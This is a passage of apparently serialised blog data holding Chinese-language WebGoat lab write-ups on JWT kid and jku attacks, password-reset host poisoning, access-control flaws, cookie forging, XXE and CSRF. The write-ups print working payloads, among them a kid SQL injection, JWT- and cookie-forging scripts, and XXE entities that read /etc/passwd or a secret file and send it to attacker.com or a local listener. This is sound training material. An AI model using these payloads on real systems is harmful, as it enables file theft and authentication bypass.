open(&quot;./rsa/private.pem&quot;, &quot;wb&quot;) as f:    f.write(private_pem)with open(&quot;./rsa/public.pem&quot;, &quot;wb&quot;) as f:    f.write(public_pem)print(&quot;✅ RSA256 密钥对已生成：private.pem 和 public.pem&quot;)\n\n然后，把公钥写成json形式，这个我也是问了ai才知道，前面一直错：\n&#123;  &quot;keys&quot;: [    &#123;      &quot;kty&quot;: &quot;RSA&quot;,      &quot;use&quot;: &quot;sig&quot;,      &quot;alg&quot;: &quot;RS256&quot;,      &quot;kid&quot;: &quot;public&quot;,      &quot;n&quot;: &quot;waG38ngPzF_qHctvoZywVkCCYCRrII9agN3sE-Tb0djiyY_0SaRi-GJttO8FT0pGysWR71p7SzMUQV15DctIcKFACLPgsWX_J_ubd7AkcNDZtj5usdODid37SA8Pflj-Ie83etC4fqcQVLNPeZkqYA2pY5y_OuttiFpwWaxpO6GVSKCyK8P3Op9rNqfoB5FdS90axTf_Peq3cNhKgRlfzrmYP9KA7w8j4wQB6YiK7FKyy05VLzAFUeuupPDLgZ3HMaD3nfE55YkAr7vJkrdg-9qh3L6uvteWj84eDRXK-lvWXbY0VMQGCj4qJXzuogHqsVggyM8E4GUEeQghOTlR6Q&quot;,      &quot;e&quot;: &quot;AQAB&quot;    &#125;  ]&#125;\n\n具体含义如下：\n\n建议让AI生成，没接触过rsa加密很容易错，把公钥提供给ai就行。\n创建一个public.json文件，然后在同目录下开一个python http服务(python -m http.server 7778)\n最后私钥签名即可，过期时间别忘记改：\n最后抓包改token就行了：\n\nkid注入kid的含义在上面学过了，就是取出对应的签名密钥。下面看关键代码：\n获取密钥的方式在这个重写方法中，调试一下能跟进去。另外要注意，key被查询出后，会进行一次base64解码再用于签名验证，所以之后注入时需要将你的密钥base64加密后再注入。\n总任务还是获取key，这里有两种方法。\n1、直接由调试获取它原本的key\n这种是非常规打法，因为现实环境不可能在审计时连上它的数据库，但这里还是讲一下。\n获取key：\n\n然后写脚本签名即可：\npublic class jtw &#123;    private static final byte[] JWT_SECRET = Base64.getDecoder().decode(&quot;qwertyqwerty1234&quot;);    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setHeaderParam(&quot;kid&quot;, &quot;webgoat_key&quot;)                .setHeaderParam(&quot;typ&quot;, &quot;JWT&quot;)                .setExpiration(Date.from(Instant.now().plusSeconds(6000)))                .claim(&quot;username&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n2、注入kid，这个就是常规方法。还是看一下主要逻辑代码：\n题目默认的kid是webgoat_key，因此我们如果想通过注入来指定任意key的话，可以将kid写成下面的值：\n&#x27; union select &#x27;a2V5&#x27; from jwt_keys where id = &#x27;webgoat_key\n\na2V5 base64解码就是key，可以自己设置别的值。\n其实还试过直接注释掉，但会报错，当时是这样写的：\n&#x27; union select &#x27;a2V5&#x27;-- \n\n报错为： unexpected end of statement  \n后面发现似乎必须有个from的操作，双横杠注释后面的空格不加也行，比如这样：\n&#x27; union select &#x27;a2V5&#x27; from jwt_keys--\n\n然后将自己的kid注入即可：\npublic class jtw &#123;    private static final String JWT_SECRET = &quot;a2V5&quot;;    public static String getSecretToken() &#123;        return Jwts.builder()                .setIssuedAt(Calendar.getInstance().getTime())                .setHeaderParam(&quot;kid&quot;, &quot;&#x27; union select &#x27;a2V5&#x27; from jwt_keys where id = &#x27;webgoat_key&quot;)                .setHeaderParam(&quot;typ&quot;, &quot;JWT&quot;)                .setExpiration(Date.from(Instant.now().plusSeconds(6000)))                .claim(&quot;username&quot;, &quot;Tom&quot;)                .claim(&quot;admin&quot;, &quot;false&quot;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)                .compact();    &#125;    public static void main(String[] args) &#123;        String secretToken = getSecretToken();        System.out.println(secretToken);    &#125;&#125;\n\n这里发现脚本中jwt key 都是base64编码的，跟进signWith方法，找实现类能发现里面还是会解码：\n这解释了为什么之前很多jwt key都是base64格式。\n最后更改token发包就行了：\n\nHSQLDB小知识在注入的过程中，踩了很多坑，后面发现都是由于不清楚HSQLDB的注入性质发生的。\nHSQLDB在select时，必须有一个from操作，不然会报错，这个跟 PostgreSQL &#x2F; MySQL &#x2F; SQLite  不一样。\n一般绕过有：\nselect 1 from (VALUES(0)) \t(VALUES(0))代表临时表，即只有一行，值为0\nselect 1 from  INFORMATION_SCHEMA.SYSTEM_USERS \n这些很多文章都没说，可能默认你会了吧，但是我当时不会，导致花了很多时间。\n密码重置第一题就是让你测试一下webwolf的收邮件功能，没什么。\n第二题让你找出其他用户最喜欢的颜色，这个其实是告诉我们，像这种安全问题有时候可以爆破，因为常见的颜色就那么几种。这里由于可以看源码，一下子就知道了：\n\n第三题这里告诉你为什么安全问题很难设置，列举了许多安全问题和其缺点，任意阅读两个即可。（怪不得现在基本看不见这种验证方式了，确实有很多问题，小时候设置的安全问题现在全忘了）\n第四题这题是修改邮箱中重置密码的链接。先来解释一下原理。\n正常情况下，重置密码的链接是发到自己邮箱里的，比如这一题填webgoat@webgoat.org，就会把邮件发到webwolf对应的邮箱里：\n\n然后点击这里的link就会进入重置密码页面（当然这里不会真的重置你的靶场登录密码）。\n这里的link是：http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n当我们将重置邮箱填tom@webgoat-cloud.org时，重置邮件会发送给tom，其link应该也是上面这种形式。但是如果攻击者对link里的host可控，就会造成这样的情况，link被修改为：http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n那么就会对攻击者的服务器发送一个重置请求。这样一来，受害者tom应该会看到浏览器什么都没打开，但是攻击者却受到了tom的重置link，即：http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364\n这样一来，攻击者只需要修改前面的host为官方地址就可以重置tom的密码了。\n接下来看代码，我们发送重置密码后具体处理逻辑如下：\n\n我们这里要进入上面那个if，所以需要手动更改host为webwolf的：\n这样进入if后，就会往userToTomResetLink中放入键值对。然后在fakeClickingLinkEmail方法里，会模拟受害者点击邮箱中的密码重置链接。这里的密码重置链接就会被我们的webwolf收到：\n于是我们就能得到tom的密码重置链接，接下来就很简单了。\n一开始没弄懂原理，直接看源码，从成功条件反推的。也是发现这里的密码重置链接并不会用一次就失效，而是可以一直用，不过如果没把Host改成webwolf就是假修改，不会生效。因为下面这个代码：\n必须进入这个if才能真正修改，而这个if对应的checkIfLinkIsFromTom中的userToTomResetLink，只有在前面Host为webwolf的时候才会添加。\n另外，userToTomResetLink始终只存在一个键值对，因为用的是put方法。而resetLinks会随着请求而一直增加，因为用的是add方法。当时迷惑为什么前者每次都会重置，明明两个都是static变量。这也算是模拟真正的重置链接只能用一次。\n安全的密码这里就是告诉你要设置强密码，没什么好说的。\n小结之前对JWT是一知半解，这次学习后算是清楚一点了，主要是做了很多实操，尤其是jku和kid。同时对HSQL的注入也有了初步认识。\n参考https://drun1baby.top/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8A)/#5-JWT-Tokens-PageLesson10-Refresh-a-token\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-有缺陷的访问控制","url":"/2025/07/26/WebGoat%E9%9D%B6%E5%9C%BA-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/","content":"Hijack a session这里考察session伪造。由于开发者的疏忽，session有时候会缺乏随机性，攻击者可通过暴力枚举session的方法来找到一个可用session 。\n来看题目。点击登录按钮并抓包，可以发现返回包中有set-cookie，如果不是第一次登录，可以把请求中的hijack_cookie删除：\n重复发包几次，可以收到不同的cookie，简单观察一下，能够发现cookie有一定规律：\n红框部分都是递增的，前面部分大多数是按1递增，中间有几个缺失。后面部分不规律递增，可能是时间戳什么的。这里其实可以想到爆破。比如前面部分11被跳过了，那11对应的后半部分应该在224398–229782之间。\n现在去看一下代码部分。\n首先是登录部分：\n\n这里逻辑比较简单，有无cookie对应不同的处理逻辑。有的话就直接进行验证，没有的话就生成然后返回。\nAuthentication.builder().id(cookieValue).build()的操作就是装配出一个身份认证实例，里面有id什么的，如下图：\n\n主要看provider.authenticate里面的逻辑：\n\n如果是没携带cookie的情况，会进入isEmpty那个if，给你的身份认证实例先设置一个id。携带cookie的话，就会进入isNotEmpty那个if，来检查你的session是否在服务器的合法列表中。\n不管怎么样，authorizedUserAutoLogin方法都会执行。这个方法的if是随机进入的，进入的话，就会产生一个新的身份认证实例，并将其添加到服务器的合法session列表中。另外，服务器只会存储最近生成的50个合法session，因为addSession中的MAX_SESSIONS是50。\n你也可以直接复制这边的合法session用来直接解题。\nInsecure Direct Object References这几题比较容易，就不写了。\n主要是考察横向越权，就是通过更改请求包中的id字段或是URL中的id字段，来访问或修改其他用户的数据。\nMissing Function Level Access Control这里的翻译是‘缺少功能级访问控制’。但是考察的点似乎都是让你找隐藏信息或者猜测路径的。\n第一题找隐藏的下拉栏，很简单，直接f12就行：\n\n看一下源码：\n\n挺坑的，一定要先写Users，再写Config，而且大小写区分。\n另外，注意这里获取的两个路径：access-control&#x2F;users-admin-fix和access-control&#x2F;config，后面要用。\n第二题让你找Jerry对应的hash。这里应该是想让我们猜测一个路径去请求，返回的结果应该会列出用户信息之类的。结合上面找到的access-control&#x2F;users-admin-fix，我们尝试访问access-control&#x2F;users。\n好吧，感觉根本猜不到，这里我直接看源码：\n\n上面那个路径访问会报错，不知道为什么，好像是模板渲染的问题。\n所以只能访问下面的路径，记得Content-Type改成json，得到hash：\n\n第三题这里也是同样的方法，不过要先发一个POST请求把自己的权限改成admin。\n代码如下：\n\n我们需要访问：access-control&#x2F;users-admin-fix，但是那里会做一个isAdmin判断。所以要先通过下面的POST路由来将我们的用户，我这里是webgoat，添加为admin：\n\n这三个参数可以直接看User类的字段，也可以发送一个空的POST请求，返回包里有。\n这样再去访问access-control&#x2F;users-admin-fix就行了：\n\nSpoofing an Authentication Cookie这里考cookie构造。\n直接看源码，主要看怎么生成cookie的：\n\n具体逻辑在这一行，跟进去：\n\n反转，hex，再base64。解密就是反过来。现在的目标，就是让解密后的结果为tom。SALT的长度是固定的，这样可以写出下面的脚本：\nimport org.springframework.security.crypto.codec.Hex;import java.nio.charset.StandardCharsets;import java.util.Base64;public class tmp &#123;    public static void main(String[] args) &#123;        String name = &quot;tom1111122222&quot;;        name = revert(name);        name = hexEncode(name);        name = base64Encode(name);        System.out.println(name);    &#125;    private static String revert(final String value) &#123;        return new StringBuilder(value).reverse().toString();    &#125;    private static String hexEncode(final String value) &#123;        char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));        return new String(encoded);    &#125;    private static String base64Encode(final String value) &#123;        return Base64.getEncoder().encodeToString(value.getBytes());    &#125;&#125;\n\n只要在tom后面任意添加10个字符就行了。带上cookie重新发包：\n\n小结总感觉没学到太多，这些东西以前好像都接触过。但是把靶场过一遍还是花了不少时间，之后遇到简单的，就专注于看代码而不是做题吧。\n然后下面还有一个密码的板块，那个就不写了，主要是讲一些加密方式，自己了解一下就行。\n参考https://drun1baby.top/2022/04/24/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-06-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/#0x03-Missing-Function-Level-Access-Control\nhttps://zhuanlan.zhihu.com/p/648214018\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"WebGoat靶场-错误的安全配置","url":"/2025/07/28/WebGoat%E9%9D%B6%E5%9C%BA-%E9%94%99%E8%AF%AF%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/","content":"前言这里包括两个内容：xxe和csrf。\n为什么归类在错误的安全配置里，我觉得是这两个漏洞的修复主要依靠各种配置，不太涉及到大量的代码修改，修复过程不容易对业务产生影响。\n刚接触网安的时候，学的是ctf。由于ctf里没遇到过太多xxe和csrf的题目，所以这一块知识一直很薄弱，借此机会巩固一下。\nxxe基础复习又去问了AI，发现了以前没注意的一些点。\n1、DTD中，通用实体不能直接引用参数实体\n&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;%all;\n\n上面的例子中，% all 这种带百分号的，就是参数实体，只能在DTD中使用。\n一开始我在想，为什么不直接写 ，而是要用 %all 套一层。后面才知道通用实体直接引用参数实体会报错。\n最后的poc：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [    &lt;!ENTITY % a SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;%a;]&gt;&lt;data&gt;&amp;send;&lt;/data&gt;\n\n\n\n第一题很简单，直接通过file协议读文件就行。记得注入的实体要写在text标签内，这样才能回显在评论区，才满足题目要求。同时注意一下windows下调用file协议读文件的格式，file:&#x2F;&#x2F;&#x2F;C:&#x2F;\n\n源码部分，重点在org.owasp.webgoat.lessons.xxe.CommentsCache#parseXml：\n\n这里调用xml解析时，securityEnabled默认是false的，所以运行外部实体和DTD。想要修复漏洞也很简单，把这些配置打开即可。由于业务中一般不会用到外部实体，所以对正常业务没有影响。\n第二题就是抓包手动将Content-Type改成application&#x2F;xml。payload和上面一致。\n源码部分就是根据Content-Type进入不同方法，没什么好说的\n\n第三题无回显的xxe。\n先看exp：\ndtd文件：\n&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;&quot;&gt;%all;\n\n数据包：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:7778/evil.dtd&quot;&gt;%dtd;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n收到请求，记得url解码：\n\n下面介绍几种常见的错误写法：\n1、直接引用参数实体\n&lt;!DOCTYPE com [&lt;!ENTITY % test &quot;aaaa&quot;&gt;&lt;!ENTITY % a &quot;%test;&quot;&gt;]&gt;和&lt;!DOCTYPE com [&lt;!ENTITY % test &quot;aaaa&quot;&gt;&lt;!ENTITY a &quot;%test;&quot;&gt;]&gt;\n\n这两种写法都会报错：参数实体引用 “%test;” 不能出现在 DTD 的内部子集中的标记内\n所以不能直接创建一个%file，然后在下面的send 中直接引用\n2、不远程加载dtd，直接写到数据包中\n我一开始想，为什么不直接写到请求体里，效果不是一样吗，就像这样：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;&quot;&gt;%all;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n然而，这里的报错和上面的是一样的。\n上面问题的原因都是一样的，就是xml1.0不允许这种语法，即不允许內部子集(没有用SYSTEM的)引用参数实体。但是通过dtd加载可以绕过这种限制。\n3、%file引用未生效\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE com [&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/snowstorm-maxy/.webgoat-2025.3/XXE/webgoat/secret.txt&quot;&gt;&lt;!ENTITY % all SYSTEM &#x27;http://127.0.0.1:7778/%file;&#x27;&gt;%all;]&gt;&lt;comment&gt;  &lt;text&gt;3213 &amp;send;&lt;/text&gt;&lt;/comment&gt;\n\n这种情况，%file不会解析\n\n总之，很多情况下我们都需要依赖dtd去远程加载，然后再到主文档里展开。\ncsrf第一题让你从非同源的host点击按钮，这里可以用到bp自带的工具：\n\n这样可以直接生成一个表单，然后从非同源位置提交：\n源码方法，这里主要是根据referer和host的关系来判断：\n\n第二题基本一样，但是这里多了一个weakAntiCSRF，相当于一个token吧，但是这个token是固定的，所以没有起到防护作用。\n\n第三题这里主要考查的是 怎么通过表单提交json格式的数据。\n我们跟之前一样，直接用bp自带的工具产生的表单在提交时会出现一个问题，即数据最后会有一个等号，导致报错：\n\n这是由于我们提交的是一个表单，表单肯定时param&#x3D;value这样的形式，但是我们的value实际为空：\n\n因此会产生这个问题。要做的就是改变value的值，使json闭合。可以这样设置：\n\n这样就行了：\n\n源码没什么可讲的，就是按之前的逻辑判断，再加一个对Content-Type的判断。\n第四题模拟受害者无意中登录攻击者的账号，攻击者从而可以记录受害者在此账号上的活动记录。\n去另外注册一个csrf-xxxx，xxx是你的用户名，然后点击题目对应的按钮就行。\n小结这里先简单过一遍，详细的后面遇到具体问题再补充\n参考https://drun1baby.top/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/\n","categories":["代码审计"],"tags":["Java安全","代码审计"]}]